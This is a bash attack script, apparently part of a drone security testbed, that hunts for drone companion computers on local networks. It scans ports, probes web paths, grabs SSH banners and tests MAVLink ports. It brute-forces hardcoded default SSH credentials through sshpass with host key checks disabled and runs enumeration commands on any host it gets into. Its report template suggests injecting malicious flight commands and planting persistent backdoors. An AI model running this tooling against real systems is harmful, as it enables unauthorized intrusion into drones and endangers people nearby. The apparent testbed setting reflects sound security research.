#!/bin/bash
# companion_computer_detection.sh - Companion Computer Detection Attack Tool
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/reconnaissance/companion_computer_detection.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Companion Computer Detection"
LOG_FILE="$(get_log_dir)/companion_computer_detection.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║    Companion Computer Detection       ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("nmap" "curl" "nc" "python3" "ssh")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    log_success "Prerequisites check completed"
}

detect_network_targets() {
    log_info "Detecting potential companion computer targets..."
    
    local networks=()
    local exclude_ips=""
    
    # 네트워크 모드 감지 및 설정
    if ip addr show | grep -q "192.168.13"; then
        networks+=("192.168.13.0/24")
        exclude_ips="--exclude 192.168.13.10"
        log_info "WiFi mode detected - scanning 192.168.13.0/24"
    fi
    
    if ip addr show | grep -q "10.13.0"; then
        networks+=("10.13.0.0/24") 
        exclude_ips="--exclude 10.13.0.1,10.13.0.5"
        log_info "Docker bridge mode detected - scanning 10.13.0.0/24"
    fi
    
    if [[ ${#networks[@]} -eq 0 ]]; then
        networks+=("192.168.1.0/24")
        log_warning "Using default network range"
    fi
    
    local all_hosts="/tmp/companion_hosts_$(date +%s).txt"
    > "$all_hosts"  # 파일 초기화
    
    # 각 네트워크에서 호스트 발견
    for network in "${networks[@]}"; do
        echo -e "${YELLOW}[*] Scanning network: $network${NC}"
        
        local temp_hosts="/tmp/hosts_${network//\//_}_$(date +%s).txt"
        nmap -sn $network $exclude_ips | grep -oP '(?<=Nmap scan report for )[0-9.]+' > "$temp_hosts"
        
        local host_count=$(wc -l < "$temp_hosts" 2>/dev/null || echo "0")
        
        if [[ $host_count -gt 0 ]]; then
            log_success "Found $host_count hosts in $network"
            cat "$temp_hosts" >> "$all_hosts"
        else
            log_warning "No hosts found in $network"
        fi
        
        rm -f "$temp_hosts"
    done
    
    echo "$all_hosts"
}

scan_companion_services() {
    local hosts_file="$1"
    
    log_info "Scanning for companion computer services..."
    
    if [[ ! -f "$hosts_file" || ! -s "$hosts_file" ]]; then
        log_error "No hosts to scan"
        return 1
    fi
    
    # 동반 컴퓨터에서 일반적으로 사용되는 포트들
    local companion_ports="22,80,443,8080,9000,5000,3000,8000,14552,5760"
    local web_ports="80,443,8080,9000,5000,3000,8000"
    local ssh_ports="22"
    local mavlink_ports="14552,5760"
    
    echo -e "${YELLOW}[*] Scanning for companion computer services...${NC}"
    
    local results_file="/tmp/companion_scan_$(date +%s).txt"
    > "$results_file"
    
    while IFS= read -r host; do
        [[ -z "$host" ]] && continue
        
        echo -e "${CYAN}[*] Scanning $host...${NC}"
        
        # 포트 스캔
        local scan_result=$(nmap -sS -sU -p "$companion_ports" --open "$host" 2>/dev/null)
        
        if echo "$scan_result" | grep -q "open"; then
            echo -e "${GREEN}  └─ Potential companion computer: $host${NC}"
            
            # 결과 저장
            echo "=== $host ===" >> "$results_file"
            echo "$scan_result" | grep -E "^[0-9]+/(tcp|udp).*open" >> "$results_file"
            echo "" >> "$results_file"
            
            # 열린 포트별 서비스 식별
            echo "$scan_result" | grep -E "^[0-9]+/(tcp|udp).*open" | while read line; do
                local port=$(echo "$line" | cut -d'/' -f1)
                local service=$(identify_companion_service "$port")
                echo "    └─ $line ($service)"
            done
        fi
        
    done < "$hosts_file"
    
    echo "$results_file"
}

identify_companion_service() {
    local port="$1"
    
    case "$port" in
        22) echo "SSH (Remote Access)" ;;
        80) echo "HTTP Web Interface" ;;
        443) echo "HTTPS Web Interface" ;;
        8080) echo "Alternative HTTP" ;;
        9000) echo "Web Management" ;;
        5000) echo "Flask/Development Server" ;;
        3000) echo "Node.js Application" ;;
        8000) echo "Python HTTP Server" ;;
        14552) echo "MAVLink Companion" ;;
        5760) echo "MAVLink SITL" ;;
        *) echo "Unknown Service" ;;
    esac
}

probe_web_interfaces() {
    local scan_results="$1"
    
    log_info "Probing web interfaces..."
    
    if [[ ! -f "$scan_results" ]]; then
        log_warning "No scan results to probe"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Probing web interfaces for companion computers...${NC}"
    
    # 웹 포트가 열린 호스트들 추출
    local web_hosts=$(grep -B1 -E "(80|443|8080|9000|5000|3000|8000)/(tcp|udp).*open" "$scan_results" | \
                     grep "^===" | sed 's/=== \(.*\) ===/\1/' | sort -u)
    
    for host in $web_hosts; do
        echo -e "${CYAN}[*] Probing web interfaces on $host...${NC}"
        
        # HTTP 포트들 확인
        for port in 80 8080 9000 5000 3000 8000; do
            if grep -q "${port}/tcp.*open" "$scan_results"; then
                probe_http_service "$host" "$port"
            fi
        done
        
        # HTTPS 포트 확인
        if grep -q "443/tcp.*open" "$scan_results"; then
            probe_https_service "$host" "443"
        fi
    done
}

probe_http_service() {
    local host="$1"
    local port="$2"
    
    echo -e "  ${CYAN}[*] Checking HTTP service on $host:$port...${NC}"
    
    # HTTP 요청 시도
    local response=$(curl -s -m 10 -I "http://$host:$port/" 2>/dev/null)
    
    if [[ -n "$response" ]]; then
        echo -e "    ${GREEN}└─ HTTP service active${NC}"
        
        # 서버 정보 추출
        local server=$(echo "$response" | grep -i "server:" | cut -d' ' -f2-)
        local powered_by=$(echo "$response" | grep -i "x-powered-by:" | cut -d' ' -f2-)
        
        [[ -n "$server" ]] && echo "      └─ Server: $server"
        [[ -n "$powered_by" ]] && echo "      └─ Powered by: $powered_by"
        
        # 일반적인 동반 컴퓨터 웹 인터페이스 확인
        check_companion_web_signatures "$host" "$port"
    else
        echo -e "    ${YELLOW}└─ No HTTP response${NC}"
    fi
}

probe_https_service() {
    local host="$1" 
    local port="$2"
    
    echo -e "  ${CYAN}[*] Checking HTTPS service on $host:$port...${NC}"
    
    local response=$(curl -s -k -m 10 -I "https://$host:$port/" 2>/dev/null)
    
    if [[ -n "$response" ]]; then
        echo -e "    ${GREEN}└─ HTTPS service active${NC}"
        
        local server=$(echo "$response" | grep -i "server:" | cut -d' ' -f2-)
        [[ -n "$server" ]] && echo "      └─ Server: $server"
        
        check_companion_web_signatures "$host" "$port" "https"
    else
        echo -e "    ${YELLOW}└─ No HTTPS response${NC}"
    fi
}

check_companion_web_signatures() {
    local host="$1"
    local port="$2"
    local protocol="${3:-http}"
    
    echo -e "    ${CYAN}└─ Checking for companion computer signatures...${NC}"
    
    # 일반적인 동반 컴퓨터 웹 인터페이스 경로들
    local paths=(
        "/"
        "/index.html"
        "/status"
        "/api"
        "/mavlink"
        "/camera"
        "/system"
        "/config"
        "/admin"
    )
    
    for path in "${paths[@]}"; do
        local url="${protocol}://${host}:${port}${path}"
        local content=$(curl -s -k -m 5 "$url" 2>/dev/null | head -20)
        
        if [[ -n "$content" ]]; then
            # 동반 컴퓨터 관련 키워드 검색
            if echo "$content" | grep -iq -E "(ardupilot|mavlink|companion|raspberry|nvidia|jetson|pixhawk|autopilot)"; then
                echo -e "      ${GREEN}└─ Companion computer signature found at $path${NC}"
                
                # 구체적인 식별 정보 추출
                local signatures=$(echo "$content" | grep -io -E "(ardupilot|mavlink|companion|raspberry|nvidia|jetson|pixhawk|autopilot)" | sort -u)
                if [[ -n "$signatures" ]]; then
                    echo "        └─ Keywords: $(echo $signatures | tr '\n' ' ')"
                fi
            fi
        fi
    done
}

analyze_ssh_services() {
    local scan_results="$1"
    
    log_info "Analyzing SSH services..."
    
    echo -e "${YELLOW}[*] Analyzing SSH services on companion computers...${NC}"
    
    # SSH 포트가 열린 호스트들 추출
    local ssh_hosts=$(grep -B1 "22/tcp.*open" "$scan_results" | \
                     grep "^===" | sed 's/=== \(.*\) ===/\1/' | sort -u)
    
    for host in $ssh_hosts; do
        echo -e "${CYAN}[*] Analyzing SSH on $host...${NC}"
        
        # SSH 배너 수집
        local ssh_banner=$(nc -w 5 "$host" 22 2>/dev/null | head -1)
        
        if [[ -n "$ssh_banner" ]]; then
            echo -e "    ${GREEN}└─ SSH Banner: $ssh_banner${NC}"
            
            # 일반적인 동반 컴퓨터 SSH 배너 패턴 확인
            if echo "$ssh_banner" | grep -iq -E "(raspberry|ubuntu|debian|jetson)"; then
                echo -e "      ${GREEN}└─ Potential companion computer platform detected${NC}"
            fi
        else
            echo -e "    ${YELLOW}└─ No SSH banner received${NC}"
        fi
        
        # 기본 사용자명으로 SSH 연결 시도 (정보 수집 목적)
        test_default_ssh_access "$host"
    done
}

test_default_ssh_access() {
    local host="$1"
    
    echo -e "    ${CYAN}└─ Testing default SSH credentials...${NC}"
    
    # 일반적인 동반 컴퓨터 기본 계정들
    local default_creds=(
        "pi:raspberry"
        "ubuntu:ubuntu"
        "nvidia:nvidia"
        "root:root"
        "admin:admin"
    )
    
    for cred in "${default_creds[@]}"; do
        local username=$(echo "$cred" | cut -d':' -f1)
        local password=$(echo "$cred" | cut -d':' -f2)
        
        # SSH 연결 시도 (매우 빠른 타임아웃)
        if timeout 3 sshpass -p "$password" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
           "$username@$host" "echo 'connected'" 2>/dev/null | grep -q "connected"; then
            echo -e "      ${RED}└─ VULNERABLE: Default credentials found ($username:$password)${NC}"
            
            # 간단한 시스템 정보 수집
            collect_ssh_info "$host" "$username" "$password"
        fi
    done
}

collect_ssh_info() {
    local host="$1"
    local username="$2" 
    local password="$3"
    
    echo -e "      ${YELLOW}└─ Collecting system information...${NC}"
    
    # 시스템 정보 수집 명령들
    local commands=(
        "uname -a"
        "cat /etc/os-release"
        "whoami"
        "pwd" 
        "ls -la"
        "ps aux | grep -E '(mavlink|ardupilot|px4)'"
        "netstat -ln | grep LISTEN"
    )
    
    for cmd in "${commands[@]}"; do
        local result=$(timeout 5 sshpass -p "$password" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
                      "$username@$host" "$cmd" 2>/dev/null)
        
        if [[ -n "$result" ]]; then
            echo "        └─ $cmd:"
            echo "$result" | sed 's/^/          /'
            
            # 로그에 기록
            echo "SSH Command ($host): $cmd" >> "$LOG_FILE"
            echo "$result" >> "$LOG_FILE"
            echo "---" >> "$LOG_FILE"
        fi
    done
}

analyze_mavlink_services() {
    local scan_results="$1"
    
    log_info "Analyzing MAVLink services..."
    
    echo -e "${YELLOW}[*] Analyzing MAVLink services on companion computers...${NC}"
    
    # MAVLink 포트가 열린 호스트들 추출
    local mavlink_hosts=$(grep -B1 -E "(14552|5760)/(tcp|udp).*open" "$scan_results" | \
                         grep "^===" | sed 's/=== \(.*\) ===/\1/' | sort -u)
    
    for host in $mavlink_hosts; do
        echo -e "${CYAN}[*] Testing MAVLink connectivity on $host...${NC}"
        
        # MAVLink 포트 테스트
        for port in 14552 5760; do
            if grep -q "${port}.*open" "$scan_results"; then
                test_mavlink_connection "$host" "$port"
            fi
        done
    done
}

test_mavlink_connection() {
    local host="$1"
    local port="$2"
    
    echo -e "    ${CYAN}└─ Testing MAVLink on $host:$port...${NC}"
    
    # MAVLink 연결 테스트 (간단한 UDP 연결)
    if nc -u -w 3 "$host" "$port" < /dev/null 2>/dev/null; then
        echo -e "      ${GREEN}└─ MAVLink service responsive${NC}"
        
        # MAVLink 메시지 수신 시도
        local mavlink_data=$(timeout 5 nc -u "$host" "$port" 2>/dev/null | hexdump -C | head -5)
        
        if [[ -n "$mavlink_data" ]]; then
            echo -e "        ${GREEN}└─ MAVLink data received:${NC}"
            echo "$mavlink_data" | sed 's/^/          /'
        fi
    else
        echo -e "      ${YELLOW}└─ No response from MAVLink service${NC}"
    fi
}

generate_companion_report() {
    local scan_results="$1"
    
    log_info "Generating companion computer detection report..."
    
    local report_file="$(get_log_dir)/companion_detection_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║        Companion Computer Detection Report        ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Scan Results: $(wc -l < "$scan_results" 2>/dev/null || echo "0") entries

╔═══ DISCOVERED SYSTEMS ═══╗

$(cat "$scan_results" | grep -E "^===|open" | head -30)

╔═══ VULNERABILITY ASSESSMENT ═══╗

$(cat "$LOG_FILE" | grep -E "(VULNERABLE|Default credentials)" | head -10)

╔═══ SERVICE ANALYSIS ═══╗

Web Interfaces Detected:
$(cat "$LOG_FILE" | grep -E "(HTTP service active|HTTPS service active)" | wc -l) services found

SSH Services Detected:
$(cat "$LOG_FILE" | grep -E "SSH Banner" | wc -l) SSH services found

MAVLink Services Detected:
$(cat "$LOG_FILE" | grep -E "MAVLink service responsive" | wc -l) MAVLink services found

╔═══ ATTACK SURFACE ANALYSIS ═══╗

Identified Attack Vectors:

1. Web Interface Attacks
   - Unprotected web management interfaces
   - Default credentials on web services
   - Potential command injection points

2. SSH-based Attacks  
   - Default SSH credentials
   - Weak authentication mechanisms
   - Remote command execution capability

3. MAVLink Protocol Attacks
   - Direct MAVLink communication access
   - Command injection possibilities
   - Telemetry data manipulation

4. Network-based Attacks
   - Network service enumeration
   - Port-based service exploitation
   - Lateral movement opportunities

╔═══ EXPLOITATION RECOMMENDATIONS ═══╗

High Priority Targets:
- Systems with default SSH credentials
- Unprotected web management interfaces
- Direct MAVLink service access

Attack Progression:
1. Exploit default credentials for initial access
2. Escalate privileges on companion systems
3. Access MAVLink communication channels
4. Inject malicious flight commands
5. Establish persistent backdoors

╔═══ DEFENSIVE COUNTERMEASURES ═══╗

Immediate Actions:
1. 기본 패스워드 변경
2. 불필요한 서비스 비활성화
3. 방화벽 규칙 강화
4. SSH 키 기반 인증 구현

Long-term Security:
1. 정기적인 보안 업데이트
2. 네트워크 분할 구현
3. 침입 탐지 시스템 배치
4. 보안 모니터링 강화

╚════════════════════════════════════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/companion_hosts_*.txt /tmp/hosts_*.txt /tmp/companion_scan_*.txt 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting companion computer detection attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # 네트워크 타겟 탐지
    local hosts_file=$(detect_network_targets)
    
    if [[ -f "$hosts_file" && -s "$hosts_file" ]]; then
        local host_count=$(wc -l < "$hosts_file")
        log_success "Found $host_count potential targets"
        
        # 동반 컴퓨터 서비스 스캔
        local scan_results=$(scan_companion_services "$hosts_file")
        
        if [[ -f "$scan_results" && -s "$scan_results" ]]; then
            # 웹 인터페이스 조사
            echo -e "\n${BLUE}[*] Investigating web interfaces...${NC}"
            probe_web_interfaces "$scan_results" | tee -a "$LOG_FILE"
            
            # SSH 서비스 분석
            echo -e "\n${BLUE}[*] Analyzing SSH services...${NC}"
            analyze_ssh_services "$scan_results" | tee -a "$LOG_FILE"
            
            # MAVLink 서비스 분석  
            echo -e "\n${BLUE}[*] Analyzing MAVLink services...${NC}"
            analyze_mavlink_services "$scan_results" | tee -a "$LOG_FILE"
            
            # 보고서 생성
            generate_companion_report "$scan_results"
        else
            log_warning "No companion computer services detected"
        fi
        
        rm -f "$scan_results"
    else
        log_error "No network targets found for scanning"
    fi
    
    cleanup
    
    log_success "Companion computer detection attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"